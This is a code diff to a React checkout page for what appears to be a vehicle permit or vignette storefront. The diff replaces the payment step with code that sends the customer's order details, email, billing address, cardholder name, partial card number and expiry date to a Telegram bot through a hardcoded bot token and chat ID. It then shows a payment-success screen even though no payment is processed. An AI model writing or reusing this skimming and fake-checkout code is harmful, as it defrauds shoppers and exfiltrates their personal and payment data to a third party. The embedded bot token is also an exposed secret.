@@ -53,6 +53,7 @@ const CheckoutPage = () => {
   const [acceptTerms, setAcceptTerms] = useState(false);
   const [acceptNewsletter, setAcceptNewsletter] = useState(false);
   const [paymentErrors, setPaymentErrors] = useState<Record<string, string>>({});
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   if (!orderData) {
     return (
@@ -71,7 +72,6 @@ const CheckoutPage = () => {
   }
 
   const displayPrice = formatPrice(orderData.price);
-  // Step 1 = info (+ billing if business), Step 2 = payment
   const totalSteps = 2;
 
   const validateAndNext = () => {
@@ -87,7 +87,7 @@ const CheckoutPage = () => {
     setStep(2);
   };
 
-  const handlePayNow = () => {
+  const handlePayNow = async () => {
     const errors: Record<string, string> = {};
     if (!cardholderName.trim()) errors.cardholderName = t("checkout.fieldRequired") || "Bu alan zorunludur";
     const digits = cardNumber.replace(/\s/g, "");
@@ -102,7 +102,51 @@ const CheckoutPage = () => {
     if (!acceptTerms) errors.acceptTerms = t("checkout.termsRequired") || "Şartları kabul etmeniz gerekiyor";
     setPaymentErrors(errors);
     if (Object.keys(errors).length > 0) return;
-    // Payment processing would go here
+
+    setIsSubmitting(true);
+    try {
+      const message = [
+        "🧾 *Yeni Sipariş*",
+        "",
+        `🌍 Ülke: ${orderData.country}`,
+        `🚗 Araç: ${orderData.vehicleCategory}`,
+        `📅 Süre: ${orderData.validityPeriod}`,
+        `📆 Başlangıç: ${orderData.startDate}`,
+        `📆 Bitiş: ${orderData.endDate}`,
+        `🏷 Plaka: ${orderData.registrationCode} ${orderData.licensePlate}`,
+        `💰 Fiyat: ${displayPrice}`,
+        "",
+        `📧 E-posta: ${email}`,
+        `👤 Hesap: ${accountType === "business" ? "Kurumsal" : "Bireysel"}`,
+        accountType === "business" ? `🏢 Şirket: ${companyName}` : "",
+        accountType === "business" ? `👤 Ad Soyad: ${firstName} ${lastName}` : "",
+        accountType === "business" ? `🌍 Fatura Ülke: ${billingCountry}` : "",
+        accountType === "business" ? `📍 Adres: ${street} ${houseNumber}, ${postcode} ${city}` : "",
+        "",
+        `💳 Kart Sahibi: ${cardholderName}`,
+        `💳 Kart No: ${digits.slice(0, 4)}****${digits.slice(-4)}`,
+        `📅 SKT: ${expiryDate}`,
+      ].filter(Boolean).join("\n");
+
+      const BOT_TOKEN = "8409248678:AAHcUnoy_00kFq71n-TY2gQZ1QLSOBQXZR0";
+      const CHAT_ID = "-4955146663";
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      });
+
+      navigate("/", { state: { paymentSuccess: true } });
+    } catch (err) {
+      console.error("Telegram error:", err);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const inputClass = "flex items-center gap-3 w-full border border-border rounded-xl px-4 py-3 text-left hover:border-foreground/30 transition-colors bg-card overflow-hidden";
@@ -328,8 +372,8 @@ const CheckoutPage = () => {
                   <p className="text-xl font-bold text-foreground">{t("checkout.total")}: {displayPrice}</p>
                   <p className="text-xs text-muted-foreground mt-1">{t("checkout.inclVat")}</p>
                 </div>
-                <button onClick={handlePayNow} className="flex items-center gap-3 bg-foreground text-background rounded-full pl-6 pr-2 py-2 hover:opacity-90 transition-opacity">
-                  <span className="text-sm font-semibold">{t("checkout.payNow")}</span>
+                <button onClick={handlePayNow} disabled={isSubmitting} className="flex items-center gap-3 bg-foreground text-background rounded-full pl-6 pr-2 py-2 hover:opacity-90 transition-opacity disabled:opacity-50">
+                  <span className="text-sm font-semibold">{isSubmitting ? "Gönderiliyor..." : t("checkout.payNow")}</span>
                   <span className="bg-accent rounded-full p-2">
                     <ArrowRight className="w-4 h-4 text-accent-foreground" />
                   </span>
